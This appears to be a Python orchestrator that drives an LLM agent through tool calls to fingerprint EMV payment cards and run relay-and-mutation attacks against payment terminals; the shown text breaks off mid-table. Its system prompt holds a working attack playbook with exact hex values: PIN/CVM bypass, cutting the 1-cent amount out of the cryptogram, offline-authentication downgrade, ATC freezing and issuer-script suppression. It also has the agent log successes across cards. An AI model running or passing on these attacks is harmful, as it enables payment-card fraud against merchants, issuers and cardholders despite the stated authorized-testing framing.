"""
emv_agent.py – Claude-powered EMV security research orchestrator

Glues card_fingerprint → mutation_engine → intercept_attack into a single
agentic loop driven by Claude.

Usage:
    python3 emv_agent.py [--reader N] [--model claude-opus-4-7] [--brute-sfi]

Workflow:
    1. Fingerprint  – CardFingerprinter profiles the inserted card
    2. Reason       – Claude picks the optimal attack vector(s)
    3. Configure    – agent writes mutations.yaml with targeted settings
    4. Execute      – launches atrium.py relay+intercept in background
    5. Monitor      – streams mutation log; explains what fired and why
"""

from __future__ import annotations

import argparse
import dataclasses
import json
import os
import signal
import subprocess
import sys
import time
from pathlib import Path
from typing import Any

from llm_provider import (
    Provider, ProviderError, ProviderUnavailable, resolve_provider,
)

# ─────────────────────────────────────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────────────────────────────────────

_HERE = Path(__file__).parent


def _to_json_safe(obj: Any) -> Any:
    """Recursively convert bytes/sets/dataclasses so json.dumps() works."""
    if isinstance(obj, (bytes, bytearray)):
        return obj.hex().upper()
    if isinstance(obj, set):
        return sorted(list(obj))
    if isinstance(obj, dict):
        return {k: _to_json_safe(v) for k, v in obj.items()}
    if isinstance(obj, list):
        return [_to_json_safe(i) for i in obj]
    if dataclasses.is_dataclass(obj) and not isinstance(obj, type):
        try:
            return _to_json_safe(dataclasses.asdict(obj))
        except Exception:
            return f"<unserializable:{type(obj).__name__}>"
    return obj


def _tail(path: Path, n: int) -> list[dict]:
    """Return last n lines of a JSONL file as parsed dicts."""
    if not path.exists():
        return []
    try:
        lines = path.read_text(encoding="utf-8").splitlines()
        out = []
        for line in lines[-n:]:
            line = line.strip()
            if line:
                try:
                    out.append(json.loads(line))
                except json.JSONDecodeError:
                    out.append({"raw": line})
        return out
    except OSError:
        return []


# ─────────────────────────────────────────────────────────────────────────────
# Tool implementations
# ─────────────────────────────────────────────────────────────────────────────

def _tool_fingerprint_card(reader_index: int = 0, brute_sfi: bool = False) -> dict:
    try:
        from card_fingerprint import CardFingerprinter
    except ImportError as e:
        return {"error": f"card_fingerprint.py not importable: {e}"}
    fp = None
    try:
        fp = CardFingerprinter(reader_index=reader_index, brute_sfi=brute_sfi)
        profile = fp.fingerprint()
        safe = _to_json_safe(profile)
        # Auto-record in card intel DB so history accumulates across sessions
        try:
            from card_intel import CardIntelDB
            idb = CardIntelDB()
            idb.record_card(safe)
            idb.close()
        except Exception:
            pass
        # Push fingerprint into the web API cache so the Card Profile view updates
        try:
            from api.routes.fingerprint import update_fingerprint
            update_fingerprint(safe)
        except Exception:
            pass
        return safe
    except Exception as e:
        return {"error": str(e), "hint": "Is pcscd running and a card inserted?"}
    finally:
        if fp is not None:
            try:
                fp.close()
            except Exception:
                pass


def _tool_load_card_intel(fingerprint_hash: str) -> dict:
    """Return full intel summary for a card keyed by its fingerprint_hash."""
    try:
        from card_intel import CardIntelDB
    except ImportError as e:
        return {"error": f"card_intel.py not importable: {e}"}
    try:
        db = CardIntelDB()
        intel = db.get_intel(fingerprint_hash)
        db.close()
        return intel
    except Exception as e:
        return {"error": str(e)}


def _tool_record_attack_result(
    fingerprint_hash: str,
    attack_name: str,
    result: str,
    mutations_fired: int = 0,
    notes: str = "",
    session_log_file: str = "",
) -> dict:
    """Persist the outcome of one attack run into the card intelligence DB."""
    try:
        from card_intel import CardIntelDB
    except ImportError as e:
        return {"error": f"card_intel.py not importable: {e}"}
    try:
        # Pull the mutation log from disk so the DB record is self-contained
        mut_log = _tail(_HERE / "logs" / "mutations.jsonl", 50)
        mut_cfg: dict = {}
        mut_cfg_path = _HERE / "mutations.yaml"
        if mut_cfg_path.exists():
            try:
                import yaml
                with open(mut_cfg_path, encoding="utf-8") as fh:
                    mut_cfg = yaml.safe_load(fh) or {}
            except Exception:
                pass

        db = CardIntelDB()
        row_id = db.record_attack(
            fingerprint_hash=fingerprint_hash,
            attack_name=attack_name,
            result=result,
            mutations_config=mut_cfg,
            mutations_fired=mutations_fired,
            mutation_log=mut_log,
            session_log_file=session_log_file,
            notes=notes,
        )
        db.close()
        return {"recorded": True, "id": row_id, "attack_name": attack_name, "result": result}
    except Exception as e:
        return {"error": str(e)}


def _tool_list_known_cards() -> dict:
    """Return a summary of every card seen in previous sessions."""
    try:
        from card_intel import CardIntelDB
    except ImportError as e:
        return {"error": f"card_intel.py not importable: {e}"}
    try:
        db = CardIntelDB()
        cards = db.list_cards()
        db.close()
        return {"cards": cards, "total": len(cards)}
    except Exception as e:
        return {"error": str(e)}


def _tool_configure_mutations(
    enabled: bool = True,
    pdol_mutations: list | None = None,
    response_mutations: list | None = None,
    injected_commands: list | None = None,
    afl_mutations: list | None = None,
    dol_mutations: list | None = None,
    log_mutations: bool = True,
    log_path: str = "logs/mutations.jsonl",
) -> dict:
    config = {
        "enabled": enabled,
        "log_mutations": log_mutations,
        "log_path": log_path,
        "pdol_mutations": pdol_mutations or [],
        "response_mutations": response_mutations or [],
        "injected_commands": injected_commands or [],
        "afl_mutations": afl_mutations or [],
        "dol_mutations": dol_mutations or [],
    }
    dest = _HERE / "mutations.yaml"
    try:
        import yaml
        with open(dest, "w", encoding="utf-8") as fh:
            yaml.dump(config, fh, default_flow_style=False, allow_unicode=True)
    except ImportError:
        # Fallback: write as JSON (mutation_engine can load .json too)
        dest = _HERE / "mutations.json"
        with open(dest, "w", encoding="utf-8") as fh:
            json.dump(config, fh, indent=2)
    return {
        "written": str(dest),
        "pdol_mutations": len(config["pdol_mutations"]),
        "response_mutations": len(config["response_mutations"]),
        "injected_commands": len(config["injected_commands"]),
    }


_relay_process: subprocess.Popen | None = None


def _tool_start_relay_session(reader_index: int = 0) -> dict:
    global _relay_process
    if _relay_process and _relay_process.poll() is None:
        return {"status": "already_running", "pid": _relay_process.pid}

    # When running embedded inside the dashboard web server, the dashboard relay
    # is already bound to port 35963.  Spawning a second subprocess relay on the
    # same port causes a race: both sockets are SO_REUSEADDR, the dashboard relay
    # wins every terminal connection (it's already in accept()), and the new relay
    # serves nobody — so mutations in the fresh subprocess never fire.
    # Solution: detect the dashboard relay and reuse it.  The MutationEngine
    # hot-reload (called on every SELECT AID) will pick up the mutations.yaml
    # that configure_mutations just wrote without needing a relay restart.
    try:
        from api.routes.session import _session_active
        if _session_active:
            return {
                "status": "running",
                "mode": "dashboard",
                "pid": "dashboard",
                "note": (
                    "Dashboard relay is already active on port 35963. "
                    "mutations.yaml will hot-reload on the next SELECT AID — "
                    "just tap the card to the terminal."
                ),
            }
    except ImportError:
        pass

    atrium = _HERE / "atrium.py"
    if not atrium.exists():
        return {"error": "atrium.py not found"}

    cmd = [sys.executable, str(atrium), "relay", "--reader", str(reader_index)]
    try:
        _relay_process = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            cwd=str(_HERE),
        )
        time.sleep(0.5)
        if _relay_process.poll() is not None:
            out, _ = _relay_process.communicate(timeout=2)
            return {"error": "process exited immediately", "output": out.decode(errors="replace")}
        return {"status": "running", "pid": _relay_process.pid, "cmd": " ".join(cmd)}
    except Exception as e:
        return {"error": str(e)}


def _tool_stop_relay_session(pid: int | None = None) -> dict:  # noqa: ARG001 – pid unused, single-session design
    global _relay_process
    proc = _relay_process
    if proc is None:
        # No subprocess relay — check whether the dashboard relay is active
        try:
            from api.routes.session import _session_active
            if _session_active:
                return {
                    "status": "dashboard_relay_active",
                    "note": "Dashboard relay is managed by the UI; stop it from the dashboard if needed.",
                }
        except ImportError:
            pass
        return {"status": "no_session"}
    if proc.poll() is not None:
        return {"status": "already_stopped", "returncode": proc.returncode}
    try:
        proc.terminate()
        proc.wait(timeout=5)
    except subprocess.TimeoutExpired:
        proc.kill()
    _relay_process = None
    return {"status": "stopped", "pid": proc.pid}


def _tool_read_mutation_log(n: int = 30) -> dict:
    path = _HERE / "logs" / "mutations.jsonl"
    records = _tail(path, n)
    return {
        "path": str(path),
        "records_returned": len(records),
        "records": records,
    }


def _tool_query_mutation_outcomes(
    fingerprint_hash: str = "",
    cross_card: bool = False,
) -> dict:
    """
    Query APDU-level outcome patterns for a card or across all cards.
    If cross_card=True, returns aggregate SW patterns across all known cards
    regardless of fingerprint_hash.
    """
    try:
        from card_intel import CardIntelDB
    except ImportError as e:
        return {"error": f"card_intel.py not importable: {e}"}
    try:
        db = CardIntelDB()
        if cross_card:
            result = db.get_cross_card_patterns()
        elif fingerprint_hash:
            result = db.get_outcomes_summary(fingerprint_hash)
        else:
            result = db.get_cross_card_patterns()
        db.close()
        return result
    except Exception as e:
        return {"error": str(e)}


def _tool_list_session_logs() -> dict:
    d = _HERE / "logs" / "sessions"
    if not d.exists():
        return {"files": []}
    files = sorted(d.glob("session_*.json"), key=lambda p: p.stat().st_mtime, reverse=True)
    return {"files": [f.name for f in files[:10]]}


def _tool_read_session_log(filename: str) -> dict:
    p = _HERE / "logs" / "sessions" / filename
    if not p.exists():
        return {"error": f"file not found: {filename}"}
    try:
        data = json.loads(p.read_text(encoding="utf-8"))
        return {"filename": filename, "data": data}
    except Exception as e:
        return {"error": str(e)}


def _wait_for_transaction_activity(timeout: int = 90, poll: int = 3) -> None:
    """
    Block until a mutation record or session log file appears, or until
    `timeout` seconds have elapsed.  Used by non-interactive mode so the
    agent doesn't conclude "no activity" before the terminal has had time
    to complete even one transaction.
    """
    import time as _time
    deadline = _time.monotonic() + timeout
    mut_path = _HERE / "logs" / "mutations.jsonl"
    sess_dir = _HERE / "logs" / "sessions"

    baseline_mut_size = mut_path.stat().st_size if mut_path.exists() else 0
    baseline_sess = set(sess_dir.glob("session_*.json")) if sess_dir.exists() else set()

    print(f"\033[2m[auto] waiting up to {timeout}s for transaction activity…\033[0m")
    while _time.monotonic() < deadline:
        _time.sleep(poll)
        # New mutation records written?
        if mut_path.exists() and mut_path.stat().st_size > baseline_mut_size:
            print("\033[2m[auto] mutation activity detected\033[0m")
            return
        # New session log file created?
        if sess_dir.exists():
            current = set(sess_dir.glob("session_*.json"))
            if current - baseline_sess:
                print("\033[2m[auto] session log activity detected\033[0m")
                return

    print("\033[2m[auto] timeout — no transaction activity detected\033[0m")


# ─────────────────────────────────────────────────────────────────────────────
# Tool dispatch table
# ─────────────────────────────────────────────────────────────────────────────

_TOOL_FNS = {
    "fingerprint_card":          lambda args: _tool_fingerprint_card(**args),
    "configure_mutations":       lambda args: _tool_configure_mutations(**args),
    "start_relay_session":       lambda args: _tool_start_relay_session(**args),
    "stop_relay_session":        lambda args: _tool_stop_relay_session(**args),
    "read_mutation_log":         lambda args: _tool_read_mutation_log(**args),
    "list_session_logs":         lambda args: _tool_list_session_logs(),
    "read_session_log":          lambda args: _tool_read_session_log(**args),
    "load_card_intel":           lambda args: _tool_load_card_intel(**args),
    "record_attack_result":      lambda args: _tool_record_attack_result(**args),
    "list_known_cards":          lambda args: _tool_list_known_cards(),
    "query_mutation_outcomes":   lambda args: _tool_query_mutation_outcomes(**args),
}

TOOLS = [
    {
        "name": "fingerprint_card",
        "description": (
            "Fingerprint the inserted EMV card. Enumerates AIDs via PSE/PPSE, "
            "reads AIP flags, AFL, PDOL structure, CVM list, crypto capabilities "
            "(RSA key sizes, CA key index), ATC, and PIN retry counter. "
            "Returns a full JSON profile. Run this first."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "reader_index": {"type": "integer", "description": "PC/SC reader index (0-based)", "default": 0},
                "brute_sfi": {"type": "boolean", "description": "Brute-force off-AFL SFIs 1-10", "default": False},
            },
            "required": [],
        },
    },
    {
        "name": "configure_mutations",
        "description": (
            "Write mutations.yaml with the attack configuration. "
            "All three mutation types can be combined: pdol_mutations (rewrite GPO fields), "
            "response_mutations (rewrite TLV tags in card responses), "
            "injected_commands (send hidden APDUs to the card). "
            "Call this before start_relay_session."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "enabled": {"type": "boolean", "default": True},
                "log_mutations": {"type": "boolean", "default": True},
                "log_path": {"type": "string", "default": "logs/mutations.jsonl"},
                "pdol_mutations": {
                    "type": "array",
                    "items": {
                        "type": "object",
                        "properties": {
                            "tag":     {"type": "string"},
                            "value":   {"type": "string"},
                            "enabled": {"type": "boolean"},
                            "comment": {"type": "string"},
                        },
                        "required": ["tag", "value"],
                    },
                },
                "response_mutations": {
                    "type": "array",
                    "items": {
                        "type": "object",
                        "properties": {
                            "tag":          {"type": "string"},
                            "mode":         {"type": "string", "enum": ["replace","delete","xor","flip_bit","prepend","append"]},
                            "value":        {"type": "string"},
                            "bit_position": {"type": "integer"},
                            "enabled":      {"type": "boolean"},
                            "comment":      {"type": "string"},
                            "on_ins":       {"type": "array", "items": {"type": "string"}},
                        },
                        "required": ["tag", "mode"],
                    },
                },
                "injected_commands": {
                    "type": "array",
                    "items": {
                        "type": "object",
                        "properties": {
                            "trigger_ins": {"type": "string"},
                            "when":        {"type": "string", "enum": ["after_response","before_command"]},
                            "apdu":        {"type": "string"},
                            "repeat":      {"type": "boolean"},
                            "enabled":     {"type": "boolean"},
                            "comment":     {"type": "string"},
                        },
                        "required": ["trigger_ins", "apdu"],
                    },
                },
                "afl_mutations": {
                    "type": "array",
                    "items": {
                        "type": "object",
                        "properties": {
                            "mode":         {"type": "string", "enum": ["skip_signed","truncate","remove_sfi","extend"]},
                            "truncate_to":  {"type": "integer"},
                            "target_sfi":   {"type": "integer"},
                            "extra_entries":{"type": "array"},
                            "enabled":      {"type": "boolean"},
                            "comment":      {"type": "string"},
                        },
                        "required": ["mode"],
                    },
                },
                "dol_mutations": {
                    "type": "array",
                    "items": {
                        "type": "object",
                        "properties": {
                            "target_tag":  {"type": "string", "enum": ["8C","8D"]},
                            "mode":        {"type": "string", "enum": ["remove_field","truncate"]},
                            "field_tag":   {"type": "string"},
                            "truncate_to": {"type": "integer"},
                            "enabled":     {"type": "boolean"},
                            "comment":     {"type": "string"},
                        },
                        "required": ["target_tag", "mode"],
                    },
                },
            },
            "required": [],
        },
    },
    {
        "name": "start_relay_session",
        "description": (
            "Launch atrium.py in relay+intercept mode as a background process. "
            "The process listens on vpcd port 35963. "
            "Call configure_mutations first. Returns the PID."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "reader_index": {"type": "integer", "default": 0},
            },
            "required": [],
        },
    },
    {
        "name": "stop_relay_session",
        "description": "Stop the background relay/intercept session.",
        "input_schema": {
            "type": "object",
            "properties": {
                "pid": {"type": "integer"},
            },
            "required": [],
        },
    },
    {
        "name": "read_mutation_log",
        "description": (
            "Read the most recent N records from logs/mutations.jsonl. "
            "Each record describes one mutation or injection that fired, "
            "with original_hex and mutated_hex. "
            "Call this after the operator has completed a transaction."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "n": {"type": "integer", "description": "Number of records to return", "default": 30},
            },
            "required": [],
        },
    },
    {
        "name": "list_session_logs",
        "description": "List the most recent session JSON log files in logs/sessions/.",
        "input_schema": {"type": "object", "properties": {}, "required": []},
    },
    {
        "name": "read_session_log",
        "description": "Read a full session JSON log by filename (from list_session_logs).",
        "input_schema": {
            "type": "object",
            "properties": {
                "filename": {"type": "string"},
            },
            "required": ["filename"],
        },
    },
    {
        "name": "load_card_intel",
        "description": (
            "Load persistent intel for a card from the cross-session database. "
            "Returns: known (bool), card profile summary, full attack history, "
            "succeeded/partial/failed lists, untried attacks, and recommended next steps. "
            "Always call this immediately after fingerprint_card."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "fingerprint_hash": {
                    "type": "string",
                    "description": "SHA-256 fingerprint_hash from the fingerprint_card result",
                },
            },
            "required": ["fingerprint_hash"],
        },
    },
    {
        "name": "record_attack_result",
        "description": (
            "Persist the outcome of one attack run into the card intelligence database. "
            "Call this at the end of every attack session (before stop_relay_session or on exit). "
            "The mutation log and config are captured automatically from disk."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "fingerprint_hash": {
                    "type": "string",
                    "description": "Card fingerprint_hash from fingerprint_card",
                },
                "attack_name": {
                    "type": "string",
                    "description": "Attack identifier, e.g. ATTACK-1, COMBO-C",
                },
                "result": {
                    "type": "string",
                    "enum": ["success", "partial", "failed", "blocked", "error"],
                    "description": (
                        "success=mutations fired and transaction approved with bypass, "
                        "partial=some mutations fired but full effect uncertain, "
                        "failed=mutations did not fire or terminal rejected, "
                        "blocked=terminal detected manipulation, "
                        "error=session error before meaningful result"
                    ),
                },
                "mutations_fired": {
                    "type": "integer",
                    "description": "Number of mutation records in the log",
                    "default": 0,
                },
                "notes": {
                    "type": "string",
                    "description": "Free-text research notes about this run",
                    "default": "",
                },
                "session_log_file": {
                    "type": "string",
                    "description": "Session log filename from list_session_logs (optional)",
                    "default": "",
                },
            },
            "required": ["fingerprint_hash", "attack_name", "result"],
        },
    },
    {
        "name": "list_known_cards",
        "description": (
            "List every card seen in previous research sessions with attack history counts. "
            "Useful at session start to check whether this card has been tested before, "
            "or to compare profiles across multiple cards."
        ),
        "input_schema": {
            "type": "object",
            "properties": {},
            "required": [],
        },
    },
    {
        "name": "query_mutation_outcomes",
        "description": (
            "Query APDU-level SW outcome patterns recorded automatically during relay sessions. "
            "Each non-routine SW code (6xxx except 61xx/6Cxx) is labelled: "
            "'security_condition' (6983/6984/6985/6986/6988 — card blocked or conditions not met) "
            "or 'interesting' (other 6xxx — unexpected behaviour). "
            "Use fingerprint_hash to get patterns for one card, or cross_card=true for global patterns. "
            "Call this after load_card_intel to refine attack selection based on what SW codes "
            "the card emitted in prior sessions — e.g. 6985 on GENERATE AC suggests the card "
            "detected CVM manipulation and AIP downgrade (ATTACK-3) should precede ATTACK-4."
        ),
        "input_schema": {
            "type": "object",
            "properties": {
                "fingerprint_hash": {
                    "type": "string",
                    "description": "Card fingerprint_hash; leave empty to get cross-card patterns",
                    "default": "",
                },
                "cross_card": {
                    "type": "boolean",
                    "description": "If true, return aggregate patterns across all cards",
                    "default": False,
                },
            },
            "required": [],
        },
    },
]

# ─────────────────────────────────────────────────────────────────────────────
# System prompt
# ─────────────────────────────────────────────────────────────────────────────

SYSTEM_PROMPT = """\
You are an EMV security research assistant operating in an authorized penetration \
testing environment. Your role is to analyze EMV smartcard profiles and orchestrate \
targeted attacks using the relay/mutation stack.

## WORKFLOW
1. Call fingerprint_card to profile the card (start here every session).
   → fingerprint_card auto-records the card in the persistent intel DB.
2. ALWAYS call load_card_intel(fingerprint_hash) immediately after fingerprint_card.
   → If known=true, read the attack_history and let recommended guide attack selection.
   → If known=false, this is a new card — start with ATTACK-5 + profile-matched attacks.
3. Analyze the profile: identify AIDs, AIP bits, CVM list, PDOL tags, crypto caps.
   Cross-reference with the intel history: skip attacks already marked "success" unless
   you have a reason to repeat; prioritise "partial" attacks (they showed some effect).
4. Select the optimal attack combination from the ATTACK PLAYBOOK below,
   informed by intel recommended list and card profile.
5. Call configure_mutations with the chosen attack settings.
6. Call start_relay_session to bring the relay online.
7. Inform the operator which physical action to take (e.g., tap card to terminal).
8. After the operator reports the transaction is done, call read_mutation_log.
9. Analyze the log to confirm which mutations fired and what changed.
10. ALWAYS call record_attack_result before ending the session:
    - result="success"  if bypass achieved (CVM skipped, cryptogram unbound, etc.)
    - result="partial"  if mutations fired but full bypass uncertain
    - result="failed"   if mutations did not fire or terminal caught the manipulation
    - result="blocked"  if terminal declined and likely detected tampering
    - result="error"    if session error prevented meaningful result
    Include notes with key observations (timing anomalies, unexpected declines, etc.).
11. Optionally call list_session_logs + read_session_log for the full APDU trace.

## CROSS-SESSION INTEL RULES
- The intel DB persists between sessions. Use load_card_intel early — it tells you
  what already worked (skip repeating successes), what showed partial effects (retry
  with a refined config), and what is untried (prioritise untried over re-testing
  successes unless doing cryptogram correlation across multiple runs).
- The recommended list is computed from card profile + history — trust it as a
  starting point but override if your analysis reveals a better vector.
- If you observe the same card appearing multiple times (times_seen > 1), check
  atc_first vs atc_last to infer offline transaction volume between sessions.
- Use list_known_cards at the start of a new engagement to check whether any cards
  from earlier sessions match (same fingerprint_hash = same physical card).

Always explain your reasoning at each step.

─────────────────────────────────────────────────────────────────────────────
## EMV PROFILE INTERPRETATION

### AIP (Application Interchange Profile, tag 82) – 2 bytes
Byte 1 bit masks:
  0x40 = SDA supported
  0x20 = DDA supported
  0x10 = Cardholder verification supported
  0x08 = Terminal risk management to be performed
  0x04 = Issuer authentication supported
  0x01 = CDA supported

### CVM List (tag 8E)
  [4B X-amount][4B Y-amount][N × 2B rules: (CVM-code)(CVM-condition)]
  CVM codes:
    0x00 = Fail    0x01 = Offline plaintext PIN    0x1E = Online PIN
    0x1F = No CVM required    0x1D = Signature    0x02 = Online PIN + sig
    Add 0x40 for "if fails, fail"; 0x40 is default; 0x41 = try next on fail
  CVM conditions:
    0x00 = Always    0x03 = If terminal supports
    0x08 = If amount ≤ X    0x09 = If amount > X
    0x0A = If amount ≤ Y    0x0B = If amount > Y

### TTQ (Terminal Transaction Qualifiers, tag 9F66) – 4 bytes
  Byte 1:  0x80=MSD  0x40=qVSDC  0x20=MChip  0x10=Contactless offline
           0x08=Online cryptogram required  0x04=CVM required  0x02=Offline PIN
  Byte 2:  0x80=Issuer update  0x40=Consumer device CVM

### Key PDOL tags to watch for
  9F66 = TTQ (if present → contactless, TTQ mutation viable)
  9F02 = Amount Authorised (if present → amount mutation viable)
  9F1A = Terminal Country Code    5F2A = Transaction Currency Code
  9A   = Transaction Date         9F21 = Transaction Time

─────────────────────────────────────────────────────────────────────────────
## ATTACK PLAYBOOK

### T=0 CONTACT CARD LENGTH RULE (CRITICAL — read before writing mutations)
On contact (T=0) cards the terminal negotiates the exact response length via the
`6C XX` status word before reading any record.  If a `replace` mutation changes
the byte count of a tag value, the response is longer or shorter than what the
terminal was promised.  On a strict T=0 terminal this is detected as a protocol
error and the terminal immediately restarts application selection — mutations fire
but the transaction never reaches GENERATE AC.

**Rule**: for `replace` mutations on contact cards, the `value` hex string MUST
produce the same number of bytes as the original tag value.

How to comply:
1. Read the card's tag value from the fingerprint_card result (e.g. `8E` CVM list).
2. Count its bytes.  That is your required replacement length.
3. Construct a replacement of exactly that many bytes.
   Example — original 8E is 14 bytes → use `00000000000000001F001F001F00` (14 bytes).
   Example — original 8E is 10 bytes → use `000000000000000 01F001F00` (10 bytes).
   Example — original 82 (AIP) is always 2 bytes → `5800` (2 bytes) is already safe.
4. Use condition byte `0x00` (Always) not `0x03` (if-terminal-supports) for No-CVM.
   `1F 00` = No CVM required, Always (works on all contact terminals).
   `1F 03` = No CVM required, if terminal supports (may evaluate False on contact).

For `delete` or `xor` mutations the length problem does not apply.
For T=1 (contactless) cards there is no Le negotiation, so length changes are fine.

─────────────────────────────────────────────────────────────────────────────

### ATTACK-1 ▸ Amount + CVM Bypass (best for contactless / no-PIN)
Condition: 9F02 (Amount) is in PDOL; CVM list has any "No CVM" or amount-threshold rule.
Technique:
  - PDOL mutation: set 9F02 = "000000000001" (1 cent) to trigger amount-threshold CVM rules
  - Response mutation: replace tag 8E — use SAME LENGTH as original 8E value (T=0 rule above).
    Check fingerprint_card result for the card's actual 8E byte count.
    Default 14-byte example: "00000000000000001F001F001F00" (No-CVM-Always ×3)
Config pattern:
  pdol_mutations:
    - {tag: "9F02", value: "000000000001", comment: "Amount: 1 cent"}
  response_mutations:
    - {tag: "8E", mode: "replace", value: "00000000000000001F001F001F00", comment: "CVM: No-CVM-Always (14B, same length as original)"}

### ATTACK-2 ▸ TTQ Manipulation (contactless cards)
Condition: 9F66 (TTQ) is in PDOL.
Technique:
  - Set TTQ = 36004000: byte1=0x36 (qVSDC+MChip+online-cryptogram, no offline-PIN),
    byte2=0x00, byte3=0x40 (kernel-specific), byte4=0x00
  - Removes offline PIN requirement; forces online auth (relay handles it)
Config pattern:
  pdol_mutations:
    - {tag: "9F66", value: "36004000", comment: "TTQ: online-only, no offline PIN"}

### ATTACK-3 ▸ CDA/DDA Downgrade
Condition: AIP byte1 has DDA (0x20) or CDA (0x01) bits set.
Technique:
  - XOR tag 82 with "2100" → clears DDA+CDA simultaneously
  - Terminal falls back to SDA rules; no dynamic data auth binding
Config pattern:
  response_mutations:
    - {tag: "82", mode: "xor", value: "2100", comment: "AIP: clear DDA+CDA"}

### ATTACK-4 ▸ CVM List Forced No-CVM
Condition: CVM list has only PIN/signature methods with no No-CVM fallback.
Technique:
  - Replace tag 8E: zero X/Y amounts, rules set to No-CVM-Always.
  - MUST use same byte length as original 8E value (see T=0 CONTACT CARD LENGTH RULE above).
  - Use condition 0x00 (Always) not 0x03 (if-terminal-supports) for contact cards.
Config pattern (14-byte original — adjust count to match your card):
  response_mutations:
    - {tag: "8E", mode: "replace", value: "00000000000000001F001F001F00", comment: "CVM: No-CVM-Always (14B)"}

### ATTACK-5 ▸ Silent Data Collection (always-on background layer)
Technique: inject GET DATA commands after key flow points without the terminal knowing.
Config pattern:
  injected_commands:
    - {trigger_ins: "AE", when: "after_response", apdu: "80CA9F3600", comment: "ATC after GenAC"}
    - {trigger_ins: "A8", when: "after_response", apdu: "80CA9F1700", comment: "PIN retry after GPO"}

### ATTACK-6 ▸ IAC-Denial Disable (force online approval)
Condition: Card has IAC-Denial (tag 9F0E) in records.
Technique:
  - XOR tag 9F0E with "FF" to zero all denial bits → card never declines offline
  - Combine with CDA downgrade for maximum effect
Config pattern:
  response_mutations:
    - {tag: "9F0E", mode: "replace", value: "0000000000", comment: "IAC-Denial: all zeros"}

### ATTACK-7 ▸ AFL Manipulation (defeat offline data authentication)
Condition: Card uses SDA or DDA (AIP bits set); AFL entries have offline_auth_records > 0.
Technique:
  skip_signed — zero offline_auth_records on every AFL entry; no records enter the signing
                scope; terminal cannot build a valid signed-data hash → SDA/DDA fails silently
                on many terminals (they fall back rather than declining)
  truncate    — keep only first entry; drops CVM list, risk data records from transaction flow
Config pattern:
  afl_mutations:
    - {mode: "skip_signed", enabled: true, comment: "AFL: remove all records from signing scope"}

### ATTACK-8 ▸ CDOL1/CDOL2 Manipulation (decouple amount from cryptogram)
Condition: CDOL1 (tag 8C) found in AFL records; 9F02 or 9F34 in CDOL1 field list.
Technique:
  - Remove 9F02 from CDOL1 → terminal omits amount from GENERATE AC data → AC has no amount binding
  - Remove 9F34 from CDOL1 → AC has no CVM-result binding → issuer cannot verify PIN was checked
  - Combine with PDOL 9F02=1¢ (ATTACK-1) for PDOL/CDOL desynchronisation:
    card bypasses CVM based on 1¢ in PDOL, but AC covers undefined amount from CDOL
Config pattern:
  dol_mutations:
    - {target_tag: "8C", mode: "remove_field", field_tag: "9F02", enabled: true}
    - {target_tag: "8C", mode: "remove_field", field_tag: "9F34", enabled: true}

### ATTACK-9 ▸ ATC / Last Online ATC Manipulation
Condition: Card echoes ATC (9F36) or Last Online ATC (9F13) in responses.
Technique:
  - Freeze ATC in GET DATA (CA) responses: issuer window check fails → replay window widens
  - Set 9F13 = current ATC: issuer sees 0 offline transactions → velocity limits bypass
Config pattern:
  response_mutations:
    - {tag: "9F36", mode: "replace", value: "0001", on_ins: ["CA"], enabled: true}
    - {tag: "9F13", mode: "replace", value: "0001", on_ins: ["CA"], enabled: true}
  injected_commands:
    - {trigger_ins: "AE", when: "after_response", apdu: "80CA9F3600", enabled: true}

### ATTACK-10 ▸ Currency + Country Code Pairing
Condition: 5F2A (Currency) and/or 9F1A (Country) in PDOL.
Technique:
  - Set 5F2A to match expected terminal currency → avoid floor-limit mismatch
  - Set 9F1A to issuer country (domestic) → forces domestic floor limit (often higher)
  - Set 9F1A to 0840 (US) while card is foreign → may trigger unexpected online routing
Config pattern:
  pdol_mutations:
    - {tag: "5F2A", value: "0978", enabled: true, comment: "Currency: EUR"}
    - {tag: "9F1A", value: "0276", enabled: true, comment: "Country: DE (issuer country)"}

### ATTACK-11 ▸ Issuer Script Suppression / Injection
Condition: Online transaction; issuer returns scripts in tags 71 / 72 after ARQC.
Technique:
  - Delete 71/72 from the response before the card sees them → suppresses PIN unblock,
    key updates, and account lifecycle changes
  - Inject crafted PUT DATA commands via injected_commands after GENERATE AC
Config pattern:
  response_mutations:
    - {tag: "71", mode: "delete", enabled: true, comment: "Strip Issuer Script 1"}
    - {tag: "72", mode: "delete", enabled: true, comment: "Strip Issuer Script 2"}

─────────────────────────────────────────────────────────────────────────────
## ATTACK SELECTION PRIORITY (apply in order, combine freely)
1. If 9F66 AND 9F02 both in PDOL → ATTACK-1 + ATTACK-2 (strongest, contactless)
2. If only 9F02 in PDOL → ATTACK-1 + ATTACK-4
3. If AIP has DDA/CDA → add ATTACK-3 + ATTACK-7 (skip_signed)
4. If CVM list PIN-only → add ATTACK-4
5. Always add ATTACK-5 (silent GET DATA injections)
6. If 9F0E in tags → add ATTACK-6
7. If CDOL1 contains 9F02 → add ATTACK-8 (PDOL/CDOL desynchronisation)
8. If card is contactless AND AIP has DDA → ATTACK-7 (skip_signed) is highest-value novel vector

## COMBINATION ATTACK MATRIX
| Combo | Attacks | Effect |
|-------|---------|--------|
| COMBO-A | 1+2+4+5 | Amount 1¢ + TTQ online-only + No-CVM list (same-length, T=0 safe) + silent collection |
| COMBO-B | 3+7 | CDA downgrade + AFL skip-signed → full offline auth defeat |
| COMBO-C | 1+8 | PDOL 1¢ (CVM bypass) + CDOL1 remove 9F02 (amount-free AC) |
| COMBO-D | 7+8 | AFL truncate + CDOL1 remove fields → minimal transaction footprint |
| COMBO-E | 9+5 | ATC freeze + silent injection → replay research dataset |

COMBO-C is the most novel finding: the terminal displays the real amount but the card's \
cryptogram is computed without an amount field, breaking the cryptographic binding \
between authorization and amount.

─────────────────────────────────────────────────────────────────────────────
## MUTATION OUTCOME LEARNING

Every relay session automatically records non-routine SW codes from the card into
the mutation_outcomes table. Use query_mutation_outcomes to read these patterns
AFTER load_card_intel to refine attack selection beyond what the attack history alone shows.

### SW code → implication table
| SW     | Label              | Meaning                                              | Attack implication              |
|--------|--------------------|------------------------------------------------------|---------------------------------|
